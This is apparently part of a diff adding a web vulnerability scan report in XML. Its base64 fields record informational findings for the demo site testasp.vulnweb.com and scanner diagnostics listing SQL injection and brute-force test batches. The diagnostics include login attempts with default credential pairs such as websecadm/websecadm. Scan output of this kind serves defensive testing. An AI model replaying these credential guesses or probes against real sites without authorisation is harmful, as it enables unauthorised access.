YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTI5Cmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTMyCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTMzCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTM1Cmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTUxCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTUzCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTU3Cmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL3Nob3d0aHJlYWQuYXNwP2lkPTYKaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vc2hvd3RocmVhZC5hc3A_aWQ9OQo]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150099</qid>
+        <title><![CDATA[Cookies Issued Without User Consent]]></title>
+        <data base64="true"><![CDATA[VG90YWwgY29va2llczogMQpBU1BTRVNTSU9OSURTQUFEQ0NUVD1ERk9HQ0JPREtOSkRJREdBQ0lOQUZQT1A7IHBhdGg9LyBGaXJzdCBzZXQgYXQgVVJMOiBodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS8K]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>45038</qid>
+        <title><![CDATA[Host Scan Time]]></title>
+        <data base64="true"><![CDATA[U2NhbiBkdXJhdGlvbjogMTQ5OCBzZWNvbmRzCgpTdGFydCB0aW1lOiBNb24sIEp1biAyMyAyMDE0LCAxODozOTo1NCBHTVQKCkVuZCB0aW1lOiBNb24sIEp1biAyMyAyMDE0LCAxOTowNDo1MiBHTVQK]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>6</qid>
+        <title><![CDATA[DNS Host Name]]></title>
+        <data base64="true"><![CDATA[I3RhYmxlCklQX2FkZHJlc3MgSG9zdF9uYW1lCgo4Ny4yMzAuMjkuMTY3IHd2cHM4Ny0yMzAtMjktMTY3LmRlZGljYXRlZC5ob3N0ZXVyb3BlLmRlCg]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150115</qid>
+        <title><![CDATA[Authentication Form found]]></title>
+        <data base64="true"><![CDATA[QXV0aGVudGljYXRpb24gZm9ybSBmb3VuZCBhdDogaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgogQWN0aW9uIHVyaTogaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgogRmllbGRzOiB0ZlVOYW1lLCB0ZlVQYXNzLCBXYXNOb05hbWVfU18yX0xvZ2lu]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150021</qid>
+        <title><![CDATA[Scan Diagnostics]]></title>
+        <data base64="true"><![CDATA[TG9hZGVkIDAgYmxhY2tsaXN0IGVudHJpZXMuCkxvYWRlZCAwIHdoaXRlbGlzdCBlbnRyaWVzLgpIVE1MIGZvcm0gYXV0aGVudGljYXRpb24gdW5hdmFpbGFibGUsIG5vIFdFQkFQUCBlbnRyeSBmb3VuZApObyBtb3JlIHJlcXVldWVzLCByZWR1bmRhbnQgbGluayB0aHJlc2hvbGQgaGFzIGJlZW4gc3VycGFzc2VkLgpDb2xsZWN0ZWQgMTk2IGxpbmtzIG92ZXJhbGwuClBhdGggbWFuaXB1bGF0aW9uOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEwIG1pbnV0ZXMgKDExNiB0ZXN0cywgNjAgaW5wdXRzKQpQYXRoIG1hbmlwdWxhdGlvbjogMTE2IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgNjUzICByZXF1ZXN0cywgMTkgc2Vjb25kcy4gQ29tcGxldGVkIDY1MyByZXF1ZXN0cyBvZiA2OTYwIGVzdGltYXRlZCByZXF1ZXN0cyAoOS4zODIxOCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpXUyBlbnVtZXJhdGlvbjogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoOSB0ZXN0cywgNTkgaW5wdXRzKQpXUyBlbnVtZXJhdGlvbjogOSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDI3ICByZXF1ZXN0cywgMSBzZWNvbmRzLiBDb21wbGV0ZWQgMjcgcmVxdWVzdHMgb2YgNTMxIGVzdGltYXRlZCByZXF1ZXN0cyAoNS4wODQ3NSUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpCYXRjaCAjMSBVUkkgcGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lICZsdDsgMSBtaW51dGUgKDQ2IHRlc3RzLCAxMSBpbnB1dHMpCkJhdGNoICMxIFVSSSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogNDYgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA1MDggIHJlcXVlc3RzLCAyMyBzZWNvbmRzLiBDb21wbGV0ZWQgNTA4IHJlcXVlc3RzIG9mIDUwNiBlc3RpbWF0ZWQgcmVxdWVzdHMgKDEwMC4zOTUlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzEgRm9ybSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoNDYgdGVzdHMsIDEgaW5wdXRzKQpCYXRjaCAjMSBGb3JtIHBhcmFtZXRlciBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiA0NiB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDM0MSAgcmVxdWVzdHMsIDE1IHNlY29uZHMuIENvbXBsZXRlZCAzNDEgcmVxdWVzdHMgb2YgNDYgZXN0aW1hdGVkIHJlcXVlc3RzICg3NDEuMzA0JSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMxIExvZ2luIGZvcm0gcGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lICZsdDsgMSBtaW51dGUgKDQ2IHRlc3RzLCAzIGlucHV0cykKQmF0Y2ggIzEgTG9naW4gZm9ybSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogNDYgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxMDggIHJlcXVlc3RzLCA1IHNlY29uZHMuIE5vIHRlc3RzIHRvIGV4ZWN1dGUuCkJhdGNoICMxIFVSSSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoOSB0ZXN0cywgMTEgaW5wdXRzKQpCYXRjaCAjMSBVUkkgYmxpbmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IDkgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCA5OSAgcmVxdWVzdHMsIDE1IHNlY29uZHMuIENvbXBsZXRlZCA5OSByZXF1ZXN0cyBvZiAyOTcgZXN0aW1hdGVkIHJlcXVlc3RzICgzMy4zMzMzJSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMxIEZvcm0gYmxpbmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IGVzdGltYXRlZCB0aW1lICZsdDsgMSBtaW51dGUgKDkgdGVzdHMsIDEgaW5wdXRzKQpCYXRjaCAjMSBGb3JtIGJsaW5kIFNRTCBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiA5IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgNjMgIHJlcXVlc3RzLCA4IHNlY29uZHMuIENvbXBsZXRlZCA2MyByZXF1ZXN0cyBvZiAyNyBlc3RpbWF0ZWQgcmVxdWVzdHMgKDIzMy4zMzMlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzEgTG9naW4gZm9ybSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoOSB0ZXN0cywgMyBpbnB1dHMpCkJhdGNoICMxIExvZ2luIGZvcm0gYmxpbmQgU1FMIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IDkgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxOCAgcmVxdWVzdHMsIDMgc2Vjb25kcy4gQ29tcGxldGVkIDE4IHJlcXVlc3RzIG9mIDI3IGVzdGltYXRlZCByZXF1ZXN0cyAoNjYuNjY2NyUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICgxMSB0ZXN0cywgMTEgaW5wdXRzKQpCYXRjaCAjMSBVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiAxMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDEyMSAgcmVxdWVzdHMsIDI3MyBzZWNvbmRzLiBDb21wbGV0ZWQgMTIxIHJlcXVlc3RzIG9mIDEyMSBlc3RpbWF0ZWQgcmVxdWVzdHMgKDEwMCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpGb3JtIGZpZWxkIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICgxMSB0ZXN0cywgMCBpbnB1dHMpCkJhdGNoICMxIEZvcm0gZmllbGQgdGltZS1iYXNlZCB0ZXN0cyAobm8gYXV0aCk6IDExIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgNzcgIHJlcXVlc3RzLCAyNzggc2Vjb25kcy4gTm8gdGVzdHMgdG8gZXhlY3V0ZS4KQmF0Y2ggIzIgVVJJIHBhcmFtZXRlciBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICg0NiB0ZXN0cywgMTEgaW5wdXRzKQpCYXRjaCAjMiBVUkkgcGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IDQ2IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgNTA2ICByZXF1ZXN0cywgMjIgc2Vjb25kcy4gQ29tcGxldGVkIDUwNiByZXF1ZXN0cyBvZiA1MDYgZXN0aW1hdGVkIHJlcXVlc3RzICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KQmF0Y2ggIzIgVVJJIGJsaW5kIFNRTCBtYW5pcHVsYXRpb24gKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICg5IHRlc3RzLCAxMSBpbnB1dHMpCkJhdGNoICMyIFVSSSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogOSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDk5ICByZXF1ZXN0cywgOSBzZWNvbmRzLiBDb21wbGV0ZWQgOTkgcmVxdWVzdHMgb2YgMjk3IGVzdGltYXRlZCByZXF1ZXN0cyAoMzMuMzMzMyUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICgxMSB0ZXN0cywgMTEgaW5wdXRzKQpCYXRjaCAjMiBVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiAxMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDEyMSAgcmVxdWVzdHMsIDIxIHNlY29uZHMuIENvbXBsZXRlZCAxMjEgcmVxdWVzdHMgb2YgMTIxIGVzdGltYXRlZCByZXF1ZXN0cyAoMTAwJSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMzIFVSSSBwYXJhbWV0ZXIgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoNDYgdGVzdHMsIDggaW5wdXRzKQpCYXRjaCAjMyBVUkkgcGFyYW1ldGVyIG1hbmlwdWxhdGlvbiAobm8gYXV0aCk6IDQ2IHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgMzcwICByZXF1ZXN0cywgMTYgc2Vjb25kcy4gQ29tcGxldGVkIDM3MCByZXF1ZXN0cyBvZiAzNjggZXN0aW1hdGVkIHJlcXVlc3RzICgxMDAuNTQzJSkuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkJhdGNoICMzIFVSSSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoOSB0ZXN0cywgOCBpbnB1dHMpCkJhdGNoICMzIFVSSSBibGluZCBTUUwgbWFuaXB1bGF0aW9uIChubyBhdXRoKTogOSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDcyICByZXF1ZXN0cywgMTEgc2Vjb25kcy4gQ29tcGxldGVkIDcyIHJlcXVlc3RzIG9mIDIxNiBlc3RpbWF0ZWQgcmVxdWVzdHMgKDMzLjMzMzMlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KVVJJIHBhcmFtZXRlciB0aW1lLWJhc2VkIHRlc3RzIChubyBhdXRoKTogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoMTEgdGVzdHMsIDggaW5wdXRzKQpCYXRjaCAjMyBVUkkgcGFyYW1ldGVyIHRpbWUtYmFzZWQgdGVzdHMgKG5vIGF1dGgpOiAxMSB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDg4ICByZXF1ZXN0cywgMTkyIHNlY29uZHMuIENvbXBsZXRlZCA4OCByZXF1ZXN0cyBvZiA4OCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDEwMCUpLiBBbGwgdGVzdHMgY29tcGxldGVkLgpIVFRQIGNhbGwgbWFuaXB1bGF0aW9uOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICgzMyB0ZXN0cywgMCBpbnB1dHMpCkhUVFAgY2FsbCBtYW5pcHVsYXRpb246IDMzIHZ1bG5zaWdzIHRlc3RzLCBjb21wbGV0ZWQgMCAgcmVxdWVzdHMsIDAgc2Vjb25kcy4gTm8gdGVzdHMgdG8gZXhlY3V0ZS4KT3BlbiBSZWRpcmVjdCBhbmFseXNpczogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoMSB0ZXN0cywgMCBpbnB1dHMpCk9wZW4gUmVkaXJlY3QgYW5hbHlzaXM6IDEgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAwICByZXF1ZXN0cywgMCBzZWNvbmRzLiBObyB0ZXN0cyB0byBleGVjdXRlLgpDU1JGOiBlc3RpbWF0ZWQgdGltZSAmbHQ7IDEgbWludXRlICgyIHRlc3RzLCAzIGlucHV0cykKQ1NSRjogMiB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDAgIHJlcXVlc3RzLCAwIHNlY29uZHMuIE5vIHRlc3RzIHRvIGV4ZWN1dGUuCkNvb2tpZSBtYW5pcHVsYXRpb246IGVzdGltYXRlZCB0aW1lICZsdDsgMTAgbWludXRlcyAoMzcgdGVzdHMsIDEgaW5wdXRzKQpDb29raWUgbWFuaXB1bGF0aW9uOiAzNyB2dWxuc2lncyB0ZXN0cywgY29tcGxldGVkIDcyOCAgcmVxdWVzdHMsIDMzIHNlY29uZHMuIENvbXBsZXRlZCA3MjggcmVxdWVzdHMgb2YgMjA3MiBlc3RpbWF0ZWQgcmVxdWVzdHMgKDM1LjEzNTElKS4gWFNTIG9wdGltaXphdGlvbiByZW1vdmVkIDEzNDQgbGlua3MuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkhlYWRlciBtYW5pcHVsYXRpb246IGVzdGltYXRlZCB0aW1lICZsdDsgMTAgbWludXRlcyAoMzcgdGVzdHMsIDU2IGlucHV0cykKSGVhZGVyIG1hbmlwdWxhdGlvbjogMzcgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxMzQ0ICByZXF1ZXN0cywgNjUgc2Vjb25kcy4gQ29tcGxldGVkIDEzNDQgcmVxdWVzdHMgb2YgNDE0NCBlc3RpbWF0ZWQgcmVxdWVzdHMgKDMyLjQzMjQlKS4gWFNTIG9wdGltaXphdGlvbiByZW1vdmVkIDEzNDQgbGlua3MuIEFsbCB0ZXN0cyBjb21wbGV0ZWQuCkxvZ2luIEJydXRlIEZvcmNlIG1hbmlwdWxhdGlvbjogZXN0aW1hdGVkIHRpbWUgJmx0OyAxIG1pbnV0ZSAoMTc0IHRlc3RzLCAxIGlucHV0cykKTG9naW4gQnJ1dGUgRm9yY2UgbWFuaXB1bGF0aW9uOiAxNzQgdnVsbnNpZ3MgdGVzdHMsIGNvbXBsZXRlZCAxNzQgIHJlcXVlc3RzLCAyOTQgc2Vjb25kcy4gQ29tcGxldGVkIDE3NCByZXF1ZXN0cyBvZiAxNzQgZXN0aW1hdGVkIHJlcXVlc3RzICgxMDAlKS4gQWxsIHRlc3RzIGNvbXBsZXRlZC4KVG90YWwgcmVxdWVzdHMgbWFkZTogNjA5MwpBdmVyYWdlIHNlcnZlciByZXNwb25zZSB0aW1lOiAwLjIyIHNlY29uZHMKTW9zdCByZWNlbnQgbGlua3M6CjIwMCBodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9Mb2dpbi5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGIC1GT1JNREFUQS0gdGZVTmFtZT13ZWJzZWNhZG0mdGZVUGFzcz13ZWJzZWNhZG0KMjAwIGh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL0xvZ2luLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YgLUZPUk1EQVRBLSB0ZlVOYW1lPXdlYnNlY2FkbSZ0ZlVQYXNzPQoyMDAgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRiAtRk9STURBVEEtIHRmVU5hbWU9d3JpdGUmdGZVUGFzcz13cml0ZQoyMDAgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRiAtRk9STURBVEEtIHRmVU5hbWU9d3JpdGUmdGZVUGFzcz0KMjAwIGh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tLwoyMDAgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vCjIwMCBodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9UZW1wbGF0aXplLmFzcD9pdGVtPWh0bWwlMkZhYm91dC5odG1sCjIwMCBodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9EZWZhdWx0LmFzcAoyMDAgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vU2VhcmNoLmFzcAoyMDAgaHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vTG9naW4uYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgo]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150042</qid>
+        <title><![CDATA[Server Returns HTTP 500 Message For Request]]></title>
+        <data base64="true"><![CDATA[aHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vU2VhcmNoLmFzcD90ZlNlYXJjaD0xCmh0dHA6Ly90ZXN0YXNwLnZ1bG53ZWIuY29tL1JlZ2lzdGVyLmFzcD9SZXRVUkw9JTJGRGVmYXVsdC5hc3AlM0YK]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150028</qid>
+        <title><![CDATA[Cookies Collected]]></title>
+        <data base64="true"><![CDATA[VG90YWwgY29va2llczogMQpBU1BTRVNTSU9OSURTQUFEQ0NUVD1GTEtHQ0JPRE1BQ0RPQkRLSkNCS0tLQkk7IHBhdGg9LyBGaXJzdCBzZXQgYXQgVVJMOiBodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS8K]]></data>
+      </WasScanIg>
+      <WasScanIg>
+        <qid>150104</qid>
+        <title><![CDATA[Form Contains Email Address Field]]></title>
+        <data base64="true"><![CDATA[aHR0cDovL3Rlc3Rhc3AudnVsbndlYi5jb20vUmVnaXN0ZXIuYXNwP1JldFVSTD0lMkZEZWZhdWx0LmFzcCUzRgpodHRwOi8vdGVzdGFzcC52dWxud2ViLmNvbS9SZWdpc3Rlci5hc3A_UmV0VVJMPSUyRkRlZmF1bHQuYXNwJTNGCg]]></data>
+      </WasScanIg>
+    </list>
+  </igs>
+</WasScan>
